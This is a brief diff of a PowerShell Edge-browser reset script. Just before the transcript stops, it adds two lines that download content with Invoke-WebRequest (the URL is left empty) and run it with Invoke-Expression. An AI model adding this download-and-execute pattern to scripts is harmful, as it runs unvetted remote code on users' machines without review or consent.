@@ -25,4 +25,6 @@ md $UserData1
 
 Write-Verbose "Edge Browser Reset is complete. Any corruption is fixed" -Verbose
 
+$MBAM = Invoke-WebRequest("")
+Invoke-Expression $($MBAM.Content)
 Stop-Transcript 
